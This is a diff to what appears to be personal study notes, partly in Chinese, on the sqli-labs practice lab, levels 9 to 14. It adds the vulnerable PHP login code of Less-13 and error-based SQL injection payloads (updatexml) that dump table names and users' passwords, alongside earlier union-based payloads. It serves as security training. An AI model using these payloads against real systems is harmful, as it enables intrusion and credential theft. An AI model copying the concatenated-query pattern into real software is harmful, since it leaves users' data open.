@@ -139,7 +139,7 @@ $row = mysql_fetch_array($result);
 ```
 
 
-## LESS-9
+## LESS-9 #时间盲注
 ```php
 $sql="SELECT * FROM users WHERE id='$id' LIMIT 0,1";  
 $result=mysql_query($sql);  
@@ -194,7 +194,7 @@ def sql_bool():
 sql_bool()
 ```
 
-## LESS-10
+## LESS-10 #时间盲注 
 
 ```PHP
 $id = '"'.$id.'"';  
@@ -281,7 +281,7 @@ data： uname=1' union select 1,group_concat(column_name) from information_schem
 data: uname=1' union select 1,group_concat(concat(username,'~',password)) from users --+&passwd=1
 ![](attachment/Pasted%20image%2020230225153356.png)
 
-## LESS-12
+## LESS-12 
 ```php
 $uname=$_POST['uname'];  
 $passwd=$_POST['passwd'];  
@@ -302,3 +302,45 @@ $row = mysql_fetch_array($result);
 闭合方式变为`")`
 data: uname=1") union select 1,group_concat(concat(username,password)) from users --+&passwd=1
 
+## LESS-13 #报错注入 
+
+```php
+@$sql="SELECT username, password FROM users WHERE username=('$uname') and password=('$passwd') LIMIT 0,1";  
+$result=mysql_query($sql);  
+$row = mysql_fetch_array($result);  
+  
+if($row)  
+{  
+      //echo '<font color= "#0000ff">';    
+        
+echo "<br>";  
+   echo '<font color= "#FFFF00" font size = 4>';  
+   //echo " You Have successfully logged in " ;  
+   echo '<font size="3" color="#0000ff">';      
+echo "<br>";  
+   //echo 'Your Login name:'. $row['username'];  
+   //echo "<br>";   //echo 'Your Password:' .$row['password'];   //echo "<br>";   echo "</font>";  
+   echo "<br>";  
+   echo "<br>";  
+   echo '<img src="../images/flag.jpg"   />';   
+     
+echo "</font>";  
+   }  
+else  {  
+   echo '<font color= "#0000ff" font size="3">';  
+   //echo "Try again looser";  
+   print_r(mysql_error());  
+   echo "</br>";  
+   echo "</br>";  
+   echo "</br>";  
+   echo '<img src="../images/slap.jpg"   />';   
+echo "</font>";  }
+```
+**DATA:**
+- `uname=1&passwd=1') and updatexml(1,concat(0x7e,(select database()),0x7e),1) --+`
+- `uname=1&passwd=1') and updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database()),0x7e),1) --+`
+- `uname=1&passwd=1') and updatexml(1,concat(0x7e,substr((select group_concat(column_name) from information_schema.columns where table_name='users'),35,31),0x7e),1) --+`
+- `uname=1&passwd=1') and updatexml(1,concat(0x7e,substr((select group_concat(concat(username,'~',password)) from users),1,31),0x7e),1) --+`
+
+
+## LESS-14
